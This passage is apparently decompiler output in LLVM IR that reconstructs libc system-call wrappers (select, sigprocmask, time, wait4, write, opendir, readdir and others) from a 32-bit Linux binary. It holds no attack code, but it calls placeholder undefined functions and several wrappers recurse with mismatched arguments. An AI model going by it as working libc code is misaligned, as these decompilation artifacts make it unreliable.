  store i32 %v2_805b168, i32* @ebx, align 4
  ret i32 %v0_805b165

; uselistorder directives
  uselistorder i32 %v1_805b14d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_805b164, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b16d = load i32, i32* @esi, align 4
  store i32 %v0_805b16d, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805b185 = load i32, i32* @ebx, align 4
  %v1_805b18d = call i32 @int80_syscall(i32 142)
  store i32 %v0_805b185, i32* @ebx, align 4
  store i32 %v1_805b18d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b18d, -4095
  br i1 %tmp, label %dec_label_pc_805b1a5, label %dec_label_pc_805b199

dec_label_pc_805b199:                             ; preds = %entry
  %v1_805b199 = call i32 @__errno_location(i32 %v0_805b185)
  %v0_805b19e = load i32, i32* %esi.global-to-local, align 4
  %v1_805b19e = sub i32 0, %v0_805b19e
  %v2_805b1a0 = inttoptr i32 %v1_805b199 to i32*
  store i32 %v1_805b19e, i32* %v2_805b1a0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b1a5

dec_label_pc_805b1a5:                             ; preds = %entry, %dec_label_pc_805b199
  %v0_805b1a6 = phi i32 [ %v1_805b18d, %entry ], [ -1, %dec_label_pc_805b199 ]
  %v2_805b1a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b1a8, i32* @esi, align 4
  ret i32 %v0_805b1a6

; uselistorder directives
  uselistorder i32 %v1_805b18d, { 1, 0, 2 }
  uselistorder i32 %v0_805b185, { 1, 0 }
  uselistorder label %dec_label_pc_805b1a5, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805b1e1 = load i32, i32* @esi, align 4
  %v4_805b1e5 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_805b1e5, i32* @ecx, align 4
  %v2_805b1f1 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805b1f1, label %dec_label_pc_805b20a, label %dec_label_pc_805b1f5

dec_label_pc_805b1f5:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_805b20a, label %dec_label_pc_805b1fa

dec_label_pc_805b1fa:                             ; preds = %dec_label_pc_805b1f5
  %v1_805b1fa = call i32 @__errno_location(i32 %v0_805b1e1)
  %v1_805b1ff = inttoptr i32 %v1_805b1fa to i32*
  store i32 22, i32* %v1_805b1ff, align 4
  br label %dec_label_pc_805b231

dec_label_pc_805b20a:                             ; preds = %dec_label_pc_805b1f5, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805b20f = load i32, i32* @ebx, align 4
  %v7_805b217 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805b20f, i32* @ebx, align 4
  store i32 %v7_805b217, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_805b217, -4095
  br i1 %tmp11, label %dec_label_pc_805b231, label %dec_label_pc_805b223

dec_label_pc_805b223:                             ; preds = %dec_label_pc_805b20a
  %v1_805b223 = call i32 @__errno_location(i32 %v0_805b20f)
  %v0_805b228 = load i32, i32* %esi.global-to-local, align 4
  %v1_805b228 = sub i32 0, %v0_805b228
  %v2_805b22a = inttoptr i32 %v1_805b223 to i32*
  store i32 %v1_805b228, i32* %v2_805b22a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b231

dec_label_pc_805b231:                             ; preds = %dec_label_pc_805b223, %dec_label_pc_805b20a, %dec_label_pc_805b1fa
  %storemerge = phi i32 [ -1, %dec_label_pc_805b1fa ], [ %v7_805b217, %dec_label_pc_805b20a ], [ -1, %dec_label_pc_805b223 ]
  %v2_805b231 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b231, i32* @edx, align 4
  store i32 %v0_805b1e1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_805b217, { 1, 0, 2 }
  uselistorder i32 %v0_805b20f, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b238 = load i32, i32* @ebx, align 4
  store i32 %v0_805b238, i32* %stack_var_-4, align 4
  %v4_805b241 = ptrtoint %_TYPEDEF_sigset_t* %arg1 to i32
  store i32 %v4_805b241, i32* %ebx.global-to-local, align 4
  %v3_805b24c = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_805b24c, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b24c, -4095
  br i1 %tmp, label %dec_label_pc_805b265, label %dec_label_pc_805b259

dec_label_pc_805b259:                             ; preds = %entry
  %v0_805b259 = load i32, i32* %stack_var_-4, align 4
  %v1_805b259 = call i32 @__errno_location(i32 %v0_805b259)
  %v0_805b25e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b25e = sub i32 0, %v0_805b25e
  %v2_805b260 = inttoptr i32 %v1_805b259 to i32*
  store i32 %v1_805b25e, i32* %v2_805b260, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b265

dec_label_pc_805b265:                             ; preds = %entry, %dec_label_pc_805b259
  %v0_805b266 = phi i32 [ %v3_805b24c, %entry ], [ -1, %dec_label_pc_805b259 ]
  %v2_805b269 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b269, i32* @ebx, align 4
  ret i32 %v0_805b266

; uselistorder directives
  uselistorder i32 %v3_805b24c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %_TYPEDEF_sigset_t* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b265, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_805b26c = load i32, i32* @edi, align 4
  store i32 %v0_805b26c, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805b274 = load i32, i32* @ebx, align 4
  %v2_805b27c = call i32 @time(i32* %arg1)
  store i32 %v0_805b274, i32* @ebx, align 4
  store i32 %v2_805b27c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805b27c, -4095
  br i1 %tmp, label %dec_label_pc_805b294, label %dec_label_pc_805b288

dec_label_pc_805b288:                             ; preds = %entry
  %v1_805b288 = call i32 @__errno_location(i32 %v0_805b274)
  %v0_805b28d = load i32, i32* %edi.global-to-local, align 4
  %v1_805b28d = sub i32 0, %v0_805b28d
  %v2_805b28f = inttoptr i32 %v1_805b288 to i32*
  store i32 %v1_805b28d, i32* %v2_805b28f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b294

dec_label_pc_805b294:                             ; preds = %entry, %dec_label_pc_805b288
  %v0_805b295 = phi i32 [ %v2_805b27c, %entry ], [ -1, %dec_label_pc_805b288 ]
  %v2_805b298 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b298, i32* @edi, align 4
  ret i32 %v0_805b295

; uselistorder directives
  uselistorder i32 %v2_805b27c, { 1, 0, 2 }
  uselistorder i32 %v0_805b274, { 1, 0 }
  uselistorder label %dec_label_pc_805b294, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805b2b4 = load i32, i32* @edi, align 4
  %v0_805b2b5 = load i32, i32* @esi, align 4
  store i32 %v0_805b2b5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_805b2c9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805b2d1 = call i32 @wait4(i32 %v0_805b2c9, i32 %v0_805b2b5, i32 %v0_805b2b4, i32 %tmp5)
  store i32 %v4_805b2d1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805b2d1, -4095
  br i1 %tmp, label %dec_label_pc_805b2e9, label %dec_label_pc_805b2dd

dec_label_pc_805b2dd:                             ; preds = %entry
  %v1_805b2dd = call i32 @__errno_location(i32 %v0_805b2c9)
  %v0_805b2e2 = load i32, i32* %esi.global-to-local, align 4
  %v1_805b2e2 = sub i32 0, %v0_805b2e2
  %v2_805b2e4 = inttoptr i32 %v1_805b2dd to i32*
  store i32 %v1_805b2e2, i32* %v2_805b2e4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b2e9

dec_label_pc_805b2e9:                             ; preds = %entry, %dec_label_pc_805b2dd
  %v0_805b2ea = phi i32 [ %v4_805b2d1, %entry ], [ -1, %dec_label_pc_805b2dd ]
  %v2_805b2ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b2ec, i32* @esi, align 4
  store i32 %v0_805b2b4, i32* @edi, align 4
  ret i32 %v0_805b2ea

; uselistorder directives
  uselistorder i32 %v4_805b2d1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b2e9, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805b301 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805b301
}

define i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b30c = load i32, i32* @edi, align 4
  store i32 %v0_805b30c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805b31c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805b324 = call i32 @write(i32 %v0_805b31c, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805b31c, i32* @ebx, align 4
  store i32 %v3_805b324, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b324, -4095
  br i1 %tmp, label %dec_label_pc_805b33c, label %dec_label_pc_805b330

dec_label_pc_805b330:                             ; preds = %entry
  %v1_805b330 = call i32 @__errno_location(i32 %v0_805b31c)
  %v0_805b335 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b335 = sub i32 0, %v0_805b335
  %v2_805b337 = inttoptr i32 %v1_805b330 to i32*
  store i32 %v1_805b335, i32* %v2_805b337, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b33c

dec_label_pc_805b33c:                             ; preds = %entry, %dec_label_pc_805b330
  %v0_805b33d = phi i32 [ %v3_805b324, %entry ], [ -1, %dec_label_pc_805b330 ]
  %v2_805b33c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b33c, i32* @edx, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805b340 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b340, i32* @edi, align 4
  ret i32 %v0_805b33d

; uselistorder directives
  uselistorder i32 %v3_805b324, { 1, 0, 2 }
  uselistorder i32 %v0_805b31c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 1, 0 }
  uselistorder label %dec_label_pc_805b33c, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805b364 = load i32, i32* @edi, align 4
  %v0_805b365 = load i32, i32* @esi, align 4
  %v0_805b366 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* @edi, align 4
  %v2_805b36e = load i32, i32* %arg1, align 4
  %v12_805b36e = icmp eq i32 %v2_805b36e, -1
  %v1_805b371 = icmp eq i1 %v12_805b36e, false
  br i1 %v1_805b371, label %dec_label_pc_805b383, label %dec_label_pc_805b373

dec_label_pc_805b373:                             ; preds = %entry
  %v1_805b373 = call i32 @__errno_location(i32 %v0_805b366)
  %v1_805b378 = inttoptr i32 %v1_805b373 to i32*
  store i32 9, i32* %v1_805b378, align 4
  br label %dec_label_pc_805b3cd

dec_label_pc_805b383:                             ; preds = %entry
  %v12_805b367 = ptrtoint i32* %stack_var_-28 to i32
  %v1_805b383 = add i32 %tmp3, 24
  store i32 %v1_805b383, i32* @ebx, align 4
  store i32 134586897, i32* %stack_var_-40, align 4
  store i32 %v12_805b367, i32* @esi, align 4
  %v4_805b392 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134586897, i32 %v1_805b383)
  %v0_805b397 = load i32, i32* @ebx, align 4
  %v1_805b39a = call i32 @pthread_mutex_lock(i32 %v0_805b397)
  %v0_805b39f = load i32, i32* @edi, align 4
  %v1_805b39f = inttoptr i32 %v0_805b39f to i32*
  %v2_805b39f = load i32, i32* %v1_805b39f, align 4
  store i32 %v2_805b39f, i32* @ebx, align 4
  store i32 -1, i32* %v1_805b39f, align 4
  %v2_805b3a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_805b3a8, i32* @ecx, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v3_805b3ac = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805b3b2 = load i32, i32* @edi, align 4
  %v1_805b3b2 = add i32 %v0_805b3b2, 12
  %v2_805b3b2 = inttoptr i32 %v1_805b3b2 to i32*
  %v3_805b3b2 = load i32, i32* %v2_805b3b2, align 4
  %v1_805b3b5 = call i32 @free(i32 %v3_805b3b2)
  %v0_805b3ba = load i32, i32* @edi, align 4
  %v1_805b3bd = call i32 @free(i32 %v0_805b3ba)
  %v0_805b3c2 = load i32, i32* @ebx, align 4
  %v1_805b3c5 = call i32 @__libc_close(i32 %v0_805b3c2)
  br label %dec_label_pc_805b3cd

dec_label_pc_805b3cd:                             ; preds = %dec_label_pc_805b373, %dec_label_pc_805b383
  %v0_805b3d3 = phi i32 [ -1, %dec_label_pc_805b373 ], [ %v1_805b3c5, %dec_label_pc_805b383 ]
  store i32 %v0_805b366, i32* @ebx, align 4
  store i32 %v0_805b365, i32* @esi, align 4
  store i32 %v0_805b364, i32* @edi, align 4
  ret i32 %v0_805b3d3

; uselistorder directives
  uselistorder label %dec_label_pc_805b3cd, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_805b3d4 = load i32, i32* @edi, align 4
  %v0_805b3d5 = load i32, i32* @esi, align 4
  %v0_805b3d6 = load i32, i32* @ebx, align 4
  store i32 %v0_805b3d6, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v4_805b3e5 = call i32 @__libc_open(i32 %arg1, i8 0, i32 %tmp10)
  %v2_805b3ed = icmp slt i32 %v4_805b3e5, 0
  br i1 %v2_805b3ed, label %dec_label_pc_805b4bc, label %dec_label_pc_805b3f7

dec_label_pc_805b3f7:                             ; preds = %entry
  %v0_805b3f7 = load i32, i32* @ebx, align 4
  %v2_805b3f9 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v4_805b3e5, i32* %stack_var_-124, align 4
  %v4_805b3ff = call i32 @fstat(i32 %v4_805b3e5, i32 %v2_805b3f9, i32 %v0_805b3f7, i32 %v0_805b3f7)
  %v2_805b407 = icmp slt i32 %v4_805b3ff, 0
  br i1 %v2_805b407, label %dec_label_pc_805b41d, label %dec_label_pc_805b40b

dec_label_pc_805b40b:                             ; preds = %dec_label_pc_805b3f7
  %v0_805b410 = load i32, i32* @edi, align 4
  store i32 %v0_805b410, i32* %stack_var_-124, align 4
  %v3_805b411 = call i32 @__libc_fcntl(i32 %v0_805b410, i32 2, i32 1)
  %v2_805b419 = icmp slt i32 %v3_805b411, 0
  %v1_805b41b = icmp eq i1 %v2_805b419, false
  br i1 %v1_805b41b, label %dec_label_pc_805b433, label %dec_label_pc_805b41d

dec_label_pc_805b41d:                             ; preds = %dec_label_pc_805b40b, %dec_label_pc_805b3f7
  %v0_805b41d = load i32, i32* %stack_var_-124, align 4
  %v1_805b41d = call i32 @__errno_location(i32 %v0_805b41d)
  %v1_805b425 = inttoptr i32 %v1_805b41d to i32*
  %v2_805b425 = load i32, i32* %v1_805b425, align 4
  store i32 %v2_805b425, i32* @esi, align 4
  store i32 %v1_805b41d, i32* @ebx, align 4
  %v0_805b429 = load i32, i32* @edi, align 4
  store i32 %v0_805b429, i32* %stack_var_-124, align 4
  %v1_805b42a = call i32 @__libc_close(i32 %v0_805b429)
  %v0_805b42f = load i32, i32* @esi, align 4
  %v1_805b42f = load i32, i32* @ebx, align 4
  %v2_805b42f = inttoptr i32 %v1_805b42f to i32*
  store i32 %v0_805b42f, i32* %v2_805b42f, align 4
  br label %dec_label_pc_805b4a8

dec_label_pc_805b433:                             ; preds = %dec_label_pc_805b40b
  store i32 48, i32* %stack_var_-124, align 4
  %v1_805b438 = call i32 @malloc(i32 48)
  %v1_805b440 = icmp eq i32 %v1_805b438, 0
  store i32 %v1_805b438, i32* @ebx, align 4
  br i1 %v1_805b440, label %dec_label_pc_805b494, label %dec_label_pc_805b446

dec_label_pc_805b446:                             ; preds = %dec_label_pc_805b433
  %v0_805b446 = load i32, i32* @edi, align 4
  %v2_805b446 = inttoptr i32 %v1_805b438 to i32*
  store i32 %v0_805b446, i32* %v2_805b446, align 4
  %v1_805b448 = add i32 %v1_805b438, 16
  %v2_805b448 = inttoptr i32 %v1_805b448 to i32*
  store i32 0, i32* %v2_805b448, align 4
  %v1_805b44f = add i32 %v1_805b438, 8
  %v2_805b44f = inttoptr i32 %v1_805b44f to i32*
  store i32 0, i32* %v2_805b44f, align 4
  %v1_805b456 = add i32 %v1_805b438, 4
  %v2_805b456 = inttoptr i32 %v1_805b456 to i32*
  store i32 0, i32* %v2_805b456, align 4
  %v1_805b466 = load i32, i32* @ebx, align 4
  %v2_805b466 = add i32 %v1_805b466, 20
  %v3_805b466 = inttoptr i32 %v2_805b466 to i32*
  store i32 %tmp, i32* %v3_805b466, align 4
  %v6_805b469 = icmp ugt i32 %tmp, 511
  br i1 %v6_805b469, label %dec_label_pc_805b472, label %dec_label_pc_805b46b

dec_label_pc_805b46b:                             ; preds = %dec_label_pc_805b446
  %v0_805b46b = load i32, i32* @ebx, align 4
  %v1_805b46b = add i32 %v0_805b46b, 20
  %v2_805b46b = inttoptr i32 %v1_805b46b to i32*
  store i32 512, i32* %v2_805b46b, align 4
  br label %dec_label_pc_805b472

dec_label_pc_805b472:                             ; preds = %dec_label_pc_805b446, %dec_label_pc_805b46b
  %v0_805b474 = load i32, i32* @ebx, align 4
  %v1_805b474 = add i32 %v0_805b474, 20
  %v2_805b474 = inttoptr i32 %v1_805b474 to i32*
  %v3_805b474 = load i32, i32* %v2_805b474, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_805b479 = call i32 @calloc(i64 1, i32 %v3_805b474)
  %v1_805b481 = icmp eq i32 %v3_805b479, 0
  %v1_805b483 = load i32, i32* @ebx, align 4
  %v2_805b483 = add i32 %v1_805b483, 12
  %v3_805b483 = inttoptr i32 %v2_805b483 to i32*
  store i32 %v3_805b479, i32* %v3_805b483, align 4
  %v1_805b486 = icmp eq i1 %v1_805b481, false
  br i1 %v1_805b486, label %dec_label_pc_805b4ac, label %dec_label_pc_805b488

dec_label_pc_805b488:                             ; preds = %dec_label_pc_805b472
  %v0_805b48b = load i32, i32* @ebx, align 4
  store i32 %v0_805b48b, i32* %stack_var_-124, align 4
  %v1_805b48c = call i32 @free(i32 %v0_805b48b)
  br label %dec_label_pc_805b494

dec_label_pc_805b494:                             ; preds = %dec_label_pc_805b433, %dec_label_pc_805b488
  %v0_805b497 = load i32, i32* @edi, align 4
  store i32 %v0_805b497, i32* %stack_var_-124, align 4
  %v1_805b498 = call i32 @__libc_close(i32 %v0_805b497)
  %v1_805b49d = call i32 @__errno_location(i32 %v0_805b497)
  %v1_805b4a2 = inttoptr i32 %v1_805b49d to i32*
  store i32 12, i32* %v1_805b4a2, align 4
  br label %dec_label_pc_805b4a8

dec_label_pc_805b4a8:                             ; preds = %dec_label_pc_805b41d, %dec_label_pc_805b494
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805b4b9

dec_label_pc_805b4ac:                             ; preds = %dec_label_pc_805b472
  %v0_805b4b0 = load i32, i32* @ebx, align 4
  %v1_805b4b0 = add i32 %v0_805b4b0, 24
  store i32 %v1_805b4b0, i32* %stack_var_-124, align 4
  %v3_805b4b4 = call i32 @pthread_mutex_init(i32 %v1_805b4b0, i32* null)
  br label %dec_label_pc_805b4b9

dec_label_pc_805b4b9:                             ; preds = %dec_label_pc_805b4a8, %dec_label_pc_805b4ac
  br label %dec_label_pc_805b4bc

dec_label_pc_805b4bc:                             ; preds = %entry, %dec_label_pc_805b4b9
  %v0_805b4bf = load i32, i32* @ebx, align 4
  %v2_805b4c1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b4c1, i32* @ebx, align 4
  store i32 %v0_805b3d5, i32* @esi, align 4
  store i32 %v0_805b3d4, i32* @edi, align 4
  ret i32 %v0_805b4bf

; uselistorder directives
  uselistorder i32 %v1_805b438, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v1_805b41d, { 1, 0 }
  uselistorder i32 %v4_805b3e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b4bc, { 1, 0 }
  uselistorder label %dec_label_pc_805b4b9, { 1, 0 }
  uselistorder label %dec_label_pc_805b4a8, { 1, 0 }
  uselistorder label %dec_label_pc_805b494, { 1, 0 }
  uselistorder label %dec_label_pc_805b472, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b4c8 = load i32, i32* @esi, align 4
  %v0_805b4c9 = load i32, i32* @ebx, align 4
  store i32 %v0_805b4c9, i32* %stack_var_-8, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_805b4d1 = add i32 %tmp3, 24
  store i32 %v1_805b4d1, i32* @ebx, align 4
  %v4_805b4df = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134586897, i32 %v1_805b4d1)
  %v0_805b4e4 = load i32, i32* @ebx, align 4
  %v1_805b4e7 = call i32 @pthread_mutex_lock(i32 %v0_805b4e4)
  br label %dec_label_pc_805b4ef

dec_label_pc_805b4ef:                             ; preds = %dec_label_pc_805b51a, %entry
  %v0_805b4ef = load i32, i32* @esi, align 4
  %v1_805b4ef = add i32 %v0_805b4ef, 8
  %v2_805b4ef = inttoptr i32 %v1_805b4ef to i32*
  %v3_805b4ef = load i32, i32* %v2_805b4ef, align 4
  %v2_805b4f2 = add i32 %v0_805b4ef, 4
  %v3_805b4f2 = inttoptr i32 %v2_805b4f2 to i32*
  %v4_805b4f2 = load i32, i32* %v3_805b4f2, align 4
  %v6_805b4f5 = icmp ugt i32 %v3_805b4ef, %v4_805b4f2
  br i1 %v6_805b4f5, label %dec_label_pc_805b51a, label %dec_label_pc_805b4f7

dec_label_pc_805b4f7:                             ; preds = %dec_label_pc_805b4ef
  %v0_805b4f7 = load i32, i32* @edx, align 4
  %v1_805b4f8 = add i32 %v0_805b4ef, 20
  %v2_805b4f8 = inttoptr i32 %v1_805b4f8 to i32*
  %v3_805b4f8 = load i32, i32* %v2_805b4f8, align 4
  %v1_805b4fb = add i32 %v0_805b4ef, 12
  %v2_805b4fb = inttoptr i32 %v1_805b4fb to i32*
  %v3_805b4fb = load i32, i32* %v2_805b4fb, align 4
  %v1_805b4fe = inttoptr i32 %v0_805b4ef to i32*
  %v2_805b4fe = load i32, i32* %v1_805b4fe, align 4
  %v4_805b500 = call i32 @__getdents(i32 %v2_805b4fe, i32 %v3_805b4fb, i32 %v3_805b4f8, i32 %v0_805b4f7)
  %tmp13 = icmp slt i32 %v4_805b500, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_805b510, label %dec_label_pc_805b50c

dec_label_pc_805b50c:                             ; preds = %dec_label_pc_805b4f7
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805b536

dec_label_pc_805b510:                             ; preds = %dec_label_pc_805b4f7
  %v1_805b510 = load i32, i32* @esi, align 4
  %v2_805b510 = add i32 %v1_805b510, 8
  %v3_805b510 = inttoptr i32 %v2_805b510 to i32*
  store i32 %v4_805b500, i32* %v3_805b510, align 4
  %v0_805b513 = load i32, i32* @esi, align 4
  %v1_805b513 = add i32 %v0_805b513, 4
  %v2_805b513 = inttoptr i32 %v1_805b513 to i32*
  store i32 0, i32* %v2_805b513, align 4
  %v0_805b51a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b51a

dec_label_pc_805b51a:                             ; preds = %dec_label_pc_805b4ef, %dec_label_pc_805b510
  %v1_805b528 = phi i32 [ %v0_805b4ef, %dec_label_pc_805b4ef ], [ %v0_805b51a.pre, %dec_label_pc_805b510 ]
  %v1_805b51a = add i32 %v1_805b528, 4
  %v2_805b51a = inttoptr i32 %v1_805b51a to i32*
  %v3_805b51a = load i32, i32* %v2_805b51a, align 4
  %v2_805b51f = add i32 %v1_805b528, 12
  %v3_805b51f = inttoptr i32 %v2_805b51f to i32*
  %v4_805b51f = load i32, i32* %v3_805b51f, align 4
  %v5_805b51f = add i32 %v4_805b51f, %v3_805b51a
  store i32 %v5_805b51f, i32* @ebx, align 4
  %v1_805b522 = add i32 %v5_805b51f, 8
  %v2_805b522 = inttoptr i32 %v1_805b522 to i16*
  %v3_805b522 = load i16, i16* %v2_805b522, align 2
  %v4_805b522 = zext i16 %v3_805b522 to i32
  store i32 %v4_805b522, i32* @edx, align 4
  %v2_805b526 = add i32 %v4_805b522, %v3_805b51a
  store i32 %v2_805b526, i32* %v2_805b51a, align 4
  %v0_805b52b = load i32, i32* @ebx, align 4
  %v1_805b52b = add i32 %v0_805b52b, 4
  %v2_805b52b = inttoptr i32 %v1_805b52b to i32*
  %v3_805b52b = load i32, i32* %v2_805b52b, align 4
  %v1_805b52e = load i32, i32* @esi, align 4
  %v2_805b52e = add i32 %v1_805b52e, 16
  %v3_805b52e = inttoptr i32 %v2_805b52e to i32*
  store i32 %v3_805b52b, i32* %v3_805b52e, align 4
  %v0_805b531 = load i32, i32* @ebx, align 4
  %v1_805b531 = inttoptr i32 %v0_805b531 to i32*
  %v2_805b531 = load i32, i32* %v1_805b531, align 4
  %v3_805b531 = icmp eq i32 %v2_805b531, 0
  br i1 %v3_805b531, label %dec_label_pc_805b4ef, label %dec_label_pc_805b536.loopexit

dec_label_pc_805b536.loopexit:                    ; preds = %dec_label_pc_805b51a
  br label %dec_label_pc_805b536

dec_label_pc_805b536:                             ; preds = %dec_label_pc_805b536.loopexit, %dec_label_pc_805b50c
  %v3_805b53f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_805b547 = load i32, i32* @ebx, align 4
  %v2_805b549 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b549, i32* @ebx, align 4
  store i32 %v0_805b4c8, i32* @esi, align 4
  ret i32 %v0_805b547

; uselistorder directives
  uselistorder i32 %v1_805b528, { 1, 0 }
  uselistorder i32 %v4_805b500, { 1, 0 }
  uselistorder i32 %v0_805b4ef, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_805b51a, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805b54c = load i32, i32* @ebp, align 4
  %v0_805b54d = load i32, i32* @edi, align 4
